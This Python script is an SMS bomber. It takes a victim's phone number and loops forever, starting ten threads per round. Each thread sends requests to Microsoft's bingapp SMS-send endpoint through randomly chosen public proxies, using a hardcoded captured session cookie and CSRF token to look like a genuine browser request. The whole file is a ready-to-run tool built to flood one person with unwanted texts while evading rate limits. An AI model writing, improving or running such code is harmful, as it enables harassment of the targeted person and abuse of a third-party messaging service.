import requests
import json
import threading
import time
import random
import logging

phone_number = input("Enter phone number (With the areacode) Ex. 17639534022: ")

logging.basicConfig(
    filename='log.log', 
    filemode='a', 
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def get_proxies():
    # First try to fetch proxies from primary source
    primary_url = "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt"
    try:
        response = requests.get(primary_url, timeout=5)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            return proxies
    except:
        pass
    
    # If fetching from primary source fails, try the backup source
    backup_url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    try:
        response = requests.get(backup_url, timeout=5)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            return proxies
    except:
        pass
    
    # If both sources fail, return an empty list
    return []

def vote(proxy):
    headers = {
        'authority': 'bingapp.microsoft.com',
        'authority': 'bingapp.microsoft.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json',
        'cookie': 'at_check=true; fptctx2=taBcrIH61PuCVH7eNCyH0OPzOrGnaCb%252f7mTjN%252fuIW2u3btoeTLyWu4HypcT6GVYPsCHDdWlpbm8BWQBAqIzz23QZgD7K6Af3csgQqvXrWskkZZXCWdI%252bRj1DWAJm8r0lEv6VCUGn4jmB1GweQ2K2KzLB7aX4%252bKNSA1pLUdk11LRx2mLDLMeNec2cmSYc2udX7ZuS1Dr8kS72lxDIVVlEZ4MuxuyEFDBYKgnP%252bPqOxzEiAShOyb265GxoCx%252bjtGtmw8y3%252fyhKmb8msRC8YWwHblgGaCn3BcyWYgSRN%252fC%252fC38%252bEf75YtTwbVc89tTI%252b732; market=US; MUID=2DB17053F1186A7F27396322F0E06BDC; XSRF-TOKEN=2023-08-18T09%3A11%3A42.512Z; _csrf=ZgAExIXWqTzb5nLBmLDmmLkO; ai_user=24jdr76KGsBZihQrRmfkiT|2023-08-18T09:11:43.093Z; arp_scroll_position=425; ai_session=D9m2VNhpyXo+AsnFLW4mfW|1692349903604|1692350889884',
        'dnt': '1',
        'origin': 'https://bingapp.microsoft.com',
        'referer': 'https://bingapp.microsoft.com/bing?style=rewards',
        'request-id': '|e8076b5dc420496aa09ca9e1fa6d9b4e.67049a4213c7400e',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'traceparent': '00-e8076b5dc420496aa09ca9e1fa6d9b4e-67049a4213c7400e-01',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'x-csrf-token': '3hUD8yhV-LmXnpqxfDipkTcx-T-c6aTzZGC8',
    }

    payload = {
        "_csrf": "3hUD8yhV-LmXnpqxfDipkTcx-T-c6aTzZGC8",
        "code": "bing",
        "number": phone_number,
        "adjust": "hh15fre_vz667pg",
        "style": "rewards",
        "go": "false",
        "url": None,
        "id": None,
        "referId": None,
        "codeTransit": None
    }

    try:
        resp = requests.post(
            "https://bingapp.microsoft.com/api/sms/send",
            headers=headers,
            json=payload,
            proxies={"https": proxy},
            timeout=15
        )
        output = resp.text
        if "SMS SENT SUCCESSFULLY!" in output:
            print("SMS SENT SUCCESSFULLY!")
        else:
            print("SMS SEND FAILED.")
    except:
        output = f"Request failed with proxy {proxy}"

    logging.info(output)
    print(output)

num_threads = 10

while True:
    proxies = get_proxies()
    if len(proxies) == 0:
        print("No proxies available, waiting for 10 seconds...")
        time.sleep(10)
        continue
    
    for i in range(num_threads):
        proxy = random.choice(proxies)
        t = threading.Thread(target=vote, args=(proxy,))
        t.start()
    
    time.sleep(1)
